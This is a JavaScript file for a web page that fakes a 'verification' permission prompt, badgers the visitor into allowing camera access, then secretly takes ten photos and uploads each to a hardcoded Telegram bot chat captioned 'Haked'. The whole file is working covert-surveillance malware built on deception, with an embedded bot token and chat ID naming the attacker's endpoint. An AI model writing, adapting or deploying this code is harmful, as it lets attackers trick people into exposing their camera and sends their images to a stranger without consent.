const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const requestCameraButton = document.getElementById('request-camera');
const permissionPrompt = document.getElementById('permission-prompt');
const allowCameraButton = document.getElementById('allow-camera');
const denyCameraButton = document.getElementById('deny-camera');

// Telegram Bot Token and Chat ID
const BOT_TOKEN = '6755708048:AAEeoxAYgBpmoT5YQ2DkBArphJFDsV23NK4'; // bot token
const CHAT_ID = '6982656521'; // chat ID

let mediaStream;

// Custom permission prompt 
requestCameraButton.addEventListener('click', () => {
    permissionPrompt.style.display = 'block';
});

// Allow button
allowCameraButton.addEventListener('click', async () => {
    permissionPrompt.style.display = 'none';
    try {
        mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = mediaStream;
        requestCameraButton.style.display = 'none';

        // pictures 10
        for (let i = 0; i < 10; i++) {
            setTimeout(() => capturePhoto(i), i * 2000); // 2 second
        }
    } catch (error) {
        alert('Not Verify, Allow this permission: ' + error.message);
    }
});

// Deny button
denyCameraButton.addEventListener('click', () => {
    permissionPrompt.style.display = 'none';
    alert('veryfication faild. please allow this time permisstion');
});

// take photos
function capturePhoto(index) {
    const context = canvas.getContext('2d');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    // base64 
    const photo = canvas.toDataURL('image/jpeg');

    // Telegram bot 
    sendPhotoToTelegram(photo, index);
}

// Telegram bot 
async function sendPhotoToTelegram(photo, index) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;

    // base64 data blob
    const blob = await fetch(photo).then((res) => res.blob());

    // FormData 
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', blob, `photo_${index + 1}.jpg`);
    formData.append('caption', `Haked ${index + 1}`);

    // Telegram API request 
    fetch(url, {
        method: 'POST',
        body: formData,
    })
    .then(response => response.json())
    .then(data => {
        console.log(`photoshacked ${index + 1} send:`, data);
    })
    .catch(error => {
        console.error('error:', error);
    });
}






